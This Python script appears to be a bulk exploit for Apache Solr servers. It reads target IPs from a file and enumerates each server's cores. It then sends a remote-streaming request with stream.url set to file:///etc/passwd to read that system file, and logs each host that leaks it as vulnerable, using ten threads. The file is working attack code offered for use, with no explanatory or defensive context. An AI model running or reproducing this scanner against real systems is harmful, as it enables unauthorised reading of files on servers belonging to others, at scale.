import requests
from concurrent.futures import ThreadPoolExecutor
import datetime
import json
import os

def verify(key,ip):
    session = requests.session()
    burp0_url = "http://"+ip+":8983/solr/"+key+"/debug/dump?param=ContentStreams"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1:8983", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://127.0.0.1:8983/solr/tesla/config", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6", "Connection": "close"}
    burp0_data = {"stream.url": "file:///etc/passwd\r\n"}
    rq = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(rq.text)
    if "root" in rq.text:
        info = f"{ip} is vulnerability!"
        print("=============================================================================================================")
        print(rq.text)
        with open("vuln.txt","a+") as f:
            f.write(info)
            f.write("\n")
        print(info)
        print("=============================================================================================================")
    return info

def get_info(ip):
    try:
        burp0_url = "http://"+str(ip)+":8983/solr/admin/cores?indexInfo=false&wt=json"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        rq = requests.get(burp0_url, headers=burp0_headers,verify=False,timeout=2)
        if rq.status_code == 200 or "name" in rq.text:
            info = ""
            with open("info.txt","a+") as f:
                f.write(str(ip))
                f.write("\n")
            data = json.loads(rq.content)
            for i in data["status"]:
                try:
                    key = data["status"][i]["name"]
                    print(key)
                    info = verify(key,ip)
                finally:
                    continue
        else:
            info = "{} is not Vulnerability!".format(ip)
    except:
        info = "{} link timeout!".format(ip)
    return info

if __name__ == "__main__":
    ip_txt = os.path.abspath("ip.txt")
    with open(ip_txt,"r") as f:
        ips = f.readlines()
        list_ip = []
        for ip in ips:
            ip = ip.strip()
            list_ip.append(ip)
    i = 1
    executor = ThreadPoolExecutor(10)
    for result in executor.map(get_info,list_ip):
        print("task{}==>{}".format(i,result))
        i += 1
